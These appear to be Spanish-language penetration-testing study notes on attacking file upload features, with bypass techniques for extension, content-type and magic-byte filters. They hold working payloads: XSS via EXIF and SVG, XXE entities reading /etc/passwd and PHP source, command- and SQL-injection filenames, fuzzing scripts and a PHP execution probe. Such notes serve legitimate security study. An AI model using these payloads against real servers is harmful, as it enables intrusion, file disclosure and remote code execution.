Un upload es peligroso cuando el servidor acepta contenido controlado por el usuario y luego:
1. **lo almacena en una ruta accesible**
2. **lo interpreta o ejecuta**
3. **lo procesa con librerías vulnerables**
4. **confía en metadatos manipulables**
5. **lo reutiliza en otros contextos**, por ejemplo HTML, PDF, XML, imágenes, backups, CDN, antivirus, indexadores

Una de las vulnerabilidades más comunes ocurre cuando no hay ningún tipo de validación a la hora de subir un archivo. Una forma fácil de saber si hay algún tipo de validación es ver si el cuadro de diálogo permite `All Files`

## Web shells y rev shells
[Artículo interesante](https://www.acunetix.com/blog/articles/introduction-web-shells-part-1/)
### Ya creadas
- En kali:
	- `/usr/share/webshells/` 
	-  `/usr/share/seclists/Web-Shells/` 
- [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) - para varios lenguajes y CMS
- [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell) - Revshell
- [phpbash](https://github.com/Arrexel/phpbash) - Webshell en bash
### Clilent-side validation
Cuando la validación se hace de parte del cliente, basta con envíar un archivo que acepte el cliente (ej: `jpeg`) e interceptar la petición para envíar el archivo que queramos
## Blacklist extensions
Ocurre cuando no se permite subir un archivo determinado porque está blacklisteado, p. ej: 
```php
$fileName = basename($_FILES["uploadFile"]["name"]); 
$extension = pathinfo($fileName, PATHINFO_EXTENSION); 
$blacklist = array('php', 'php7', 'phps'); 

if (in_array($extension, $blacklist)) { 
	echo "File type not allowed"; 
	die();
}
```
Esto se puede bypasear haciendo fuzzing de extensiones.
- Puede ser útil tener en cuenta el siguiente [diccionario de Web Extensions de Seclist](https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-extensions.txt)

## Whitelist extensions
En este caso se esperan extensiones de un formato determinado, por ejemplo, con expresiones regulares como la que sigue:

```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
```
Si el backend fuera del estilo como sigue 
```php
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```
un archivo con el formato `malicius.php.jpg` podría pasar como válido.
Hay otros caracteres que hacen que la aplicación malinterprete lo que el usuario está introduciendo, p.ej `shell.php%00.jpg` se guardaría como `shell.php` en el back en servidores php `5.x` o anteriores.  

## Type filters
Los servidores, en muchas ocasiones, además del nombre del archivo, también tienen en cuenta el contenido. Hay dos formas comunes de validar el contenido, mediante `Content-Type Header` o `File Content`
- **Content-type**: Podemos probar los contenidos válidos con un diccionario como el que sigue: [Seclist-Content-type](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt) . Ocurre por un back-end similar a este: 
	```php
	$type = $_FILES['uploadFile']['type'];
	
	if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
	echo "Only images are allowed";
	die();
	}
	```
- **MIME-Type**: En este aso se espera la firma de un archivo o ciertos magic numbers en el archivo. La idea subyacente es esta: 
	```bash
	echo "GIF8" > text.jpg 
	file text.jpg 
	text.jpg: GIF image data
	```
	y ocurre por un back-end similar a este: 
	```php
	$type = mime_content_type($_FILES['uploadFile']['tmp_name']); if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) { echo "Only images are allowed"; die(); }
	```
	Aquí hay una lista para generar archivos con firmas válidas : 
	```bash
	printf '\xFF\xD8\xFF' > signature-jpeg.jpg
	printf '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A' > signature-png.png
	printf '\x47\x49\x46\x38\x37\x61' > signature-gif87a.gif
	printf '\x47\x49\x46\x38\x39\x61' > signature-gif89a.gif
	printf '\x25\x50\x44\x46\x2D' > signature-pdf.pdf
	printf '\x50\x4B\x03\x04' > signature-zip.zip
	printf '\x1F\x8B\x08' > signature-gzip.gz
	printf '\x42\x4D' > signature-bmp.bmp
	printf '\x49\x49\x2A\x00' > signature-tiff-le.tiff
	printf '\x4D\x4D\x00\x2A' > signature-tiff-be.tiff
	printf '\x52\x49\x46\x46\x00\x00\x00\x00\x57\x45\x42\x50' > signature-webp.webp
	printf '\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1' > signature-ole.bin
	printf '\x7F\x45\x4C\x46' > signature-elf.bin
	printf '\x4D\x5A' > signature-pe.exe
	```
## Limited Upload
Si el upload no permite código ejecutable, podemos buscar impacto mediante algunos formatos:

```
HTML/SVG → XSS
SVG/XML → XXE / SSRF
JPG/PNG → EXIF / parsers / dimensiones
ZIP/TAR → Zip Slip / extracción
PDF/Office → parser abuse
archivos grandes → resource exhaustion controlado
```
### XSS
Si la aplicación permite subir archivos en formato `HTML` ó `SVG`,  un file-upload podría derivar en un stored XSS. 
- Si se muestran los metadatos de una imagen, podemos explotarlo como sigue: 
	```bash
	exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
	```
- Si somos capaces de cambiar el contenido a `text/html`, algunas webs podrían mostrar el contenido del archivo subido como si fuera `HTML`
- Si la aplicación admite imágenes `SVG`, podríamos tratar de buscar acontecer un XSS como sigue: 
	```xml
	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
	<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
	    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
	    <script type="text/javascript">alert(window.origin);</script>
	</svg>
	```

### XXE
Cuando la aplicación acepta imágenes `SVG`, podemos intentar ideas como las que siguen: 
- Crear un XML para leer el contenido de un archivo: 
	```xml
	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
	<svg>&xxe;</svg>
	```
- Crear un XML para leer  el código de aplicaciones php:

```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]> 
<svg>&xxe;</svg>
```
## Otros ataques
### Injections in File Name
- Si el backend de la aplicación en algún momento utiliza alguna función del sistema para manejar el archivo subido (ej: `mv file /tmp)` . Esto acontecería `command injection` como sigue:
	- `file$(whoami).jpg` or ``file`whoami`.jpg`` or `file.jpg||whoami`
- También podemos intentar **XSS** si sospechamos que el nombre del archivo se renderiza en algún momento :
	- `<script>alert(window.origin);</script>`
- O intentar inyección SQL si sospechamos que se procesa el archivo en alguna base de datos o similar: 
	- `file';select+sleep(5);--.jpg`

### Upload Directory Disclosure
Si no conocemos dónde se guarda el archivo subido, podemos intentar hacer fuzzing para adivinar dónde se sube, o intentar ideas como tratar de generar errores (nombre de archivo que ya existe, mandar dos request iguales simultáneamente, poner un nombre de archivo con una cantidad muy grande de caracteres...)
### Windows Specific
Podemos utilizar carácteres reservados, como `|`, `<`, `>`, `*`, o `?`. Si la página web no los sanetiza correctamente, pueden referenciar a otros archivos o archivos que no existen (causando Upload Disclosure). Ocurre lo mismo si utilizamos palabras reservadas como (`CON`, `COM1`, `LPT1`, o `NUL`)
En versiones antinugas de Windows ( [8.3 Filename Convention](https://en.wikipedia.org/wiki/8.3_filename)), podemos sobreescribir archivos existentes o hacer referencia a algunos que no existen (p.e: `HAC~1.TXT` se podría referenciar a un archivo llamado `hackthebox.txt`)
## Fuzzing
Revisar la creación de la [herramienta en github](https://github.com/an0nio/fileUpload-dictionary-toolkit) - La intención es que [esta herramienta](https://github.com/an0nio/web-dict-composer) la termine sustituyendo. Se deja todo en los apuntes. TODO: Eliminar la referencia inválida una vez creadas las herramientas

### Caso práctico
Script interesante para generar un diccionario para bypasear extensiones.
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
for ext in '.php' '.php3' '.php4' '.php5' '.php7' '.pht' '.phps' '.phar' '.phpt' '.pgif' '.phtml' '.phtm' '.inc' ; do
	echo "shell$char$ext.jpg" >> wordlist.txt
	echo "shell$ext$char.jpg" >> wordlist.txt
	echo "shell.jpg$char$ext" >> wordlist.txt
	echo "shell.jpg$ext$char" >> wordlist.txt
done
done
```
Una vez hemos hecho fuzzing y encontrado las extensiones válidas de subida de archivo, p.ej: `fuzzingValido`, del siguiente modo: 

```bash
# Primero fuzzing
ffuf -request upload.req -request-proto http -w wordlist.txt -mr 'File successfully uploaded' -o fuzzing_results
# Después guardar solo los resultados en un archivo
jq -r '.results.[].input.FUZZ' fuzzing_results > fuzzingValido
```
podemos utilizar el siguiente script para generar otro diccionario con el que probar si el archivo se ha subido correctamente
```python
#!/usr/bin/env python3
from urllib.parse import unquote, quote
import sys
import re

CONTROL_CHARS = ["\x00", "\n", "\r", "\t", "\x0b", "\x0c"]

def add(out, value):
    value = value.strip()
    if value:
        out.add(value)

def url_quote_path(s):
    """
    Codifica caracteres problemáticos para URL path.
    Mantiene / para probar casos path-like tipo shell.php/.jpg.
    """
    return quote(s, safe="/._-~:")

def remove_controls(s):
    for c in CONTROL_CHARS:
        s = s.replace(c, "")
    return s

def truncate_at_controls(s):
    positions = [s.find(c) for c in CONTROL_CHARS if c in s]
    if not positions:
        return s
    return s[:min(positions)]

def normalize_windowsish(s):
    """
    Casos típicos de normalización:
    - trailing dot
    - trailing space
    - backslash tratado raro
    """
    variants = set()

    variants.add(s.rstrip(" ."))
    variants.add(s.replace("\\", ""))
    variants.add(s.replace("\\", "/"))
    variants.add(s.replace("/.", "."))
    variants.add(s.replace("./", ""))

    return variants

def generate(name):
    out = set()

    original = name.strip()
    if not original:
        return out

    # 1. Tal cual, por si quieres que el servidor decodifique %XX en la URL
    add(out, original)

    # 2. Literal seguro: si el backend guardó "%0a" como texto,
    # hay que pedir "%250a"
    add(out, url_quote_path(original))

    # 3. Decode una vez: %0a -> newline, %20 -> espacio, %00 -> NUL
    dec1 = unquote(original)
    add(out, url_quote_path(dec1))

    # 4. Decode dos veces: útil si tenías %2500, %252f, etc.
    dec2 = unquote(dec1)
    add(out, url_quote_path(dec2))

    # 5. Si el backend eliminó caracteres de control
    add(out, url_quote_path(remove_controls(dec1)))
    add(out, url_quote_path(remove_controls(dec2)))

    # 6. Si el backend truncó en NUL/newline/tab/CR
    add(out, url_quote_path(truncate_at_controls(dec1)))
    add(out, url_quote_path(truncate_at_controls(dec2)))

    # 7. Si hizo trim de espacios/puntos al final
    add(out, url_quote_path(dec1.strip(" .\r\n\t\x00")))
    add(out, url_quote_path(dec2.strip(" .\r\n\t\x00")))

    # 8. Normalizaciones tipo Windows / parser raro
    for v in normalize_windowsish(dec1):
        add(out, url_quote_path(v))

    for v in normalize_windowsish(dec2):
        add(out, url_quote_path(v))

    # 9. Casos comunes: eliminar %XX conflictivos sin decodificar
    raw_removed = re.sub(r"%00|%0a|%0A|%0d|%0D|%09|%20", "", original)
    add(out, raw_removed)
    add(out, url_quote_path(raw_removed))

    return out

def main():
    if len(sys.argv) != 2:
        print(f"Uso: {sys.argv[0]} fuzzingValido", file=sys.stderr)
        sys.exit(1)

    all_candidates = set()

    with open(sys.argv[1], "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            name = line.strip()
            if not name:
                continue

            for candidate in generate(name):
                all_candidates.add(candidate)

    for c in sorted(all_candidates):
        print(c)

if __name__ == "__main__":
    main()
```

Probamos qué nombres existen realmente en la carpeta pública:
```bash
# generamos candidatos válidos
./gen_get_candidates.py fuzzingValido > candidatos_get.txt
# probamos si devuelve algo distinto a 404
ffuf \  
-w candidatos_get.txt \  
-u "$target/profile_images/FUZZ" \  
-mc all \  
-fc 404 \  
-raw \  
-of json \  
-o getExistentes.json
```
En lugar de subir una reverse shell directamente, es mejor subir primero un payload de prueba con un marcador único.
`cGhwX2Z1bmNpb25h` es `php_funciona` en base64:
```php
GIF87a
<?php
echo base64_decode("cGhwX2Z1bmNpb25h") . "\n";
echo "basename_hex=" . bin2hex(basename(__FILE__)) . "\n";
echo "request_uri=" . ($_SERVER["REQUEST_URI"] ?? "") . "\n";
?>
```
Si el servidor interpreta PHP, la respuesta contendrá:

```
php_funciona
```

Entonces buscamos ejecución real:

```bash
ffuf \
-w candidatos_get.txt \
-u "http://$target/profile_images/FUZZ" \
-mr 'php_funciona' \
-raw -o getRCE.json 
```

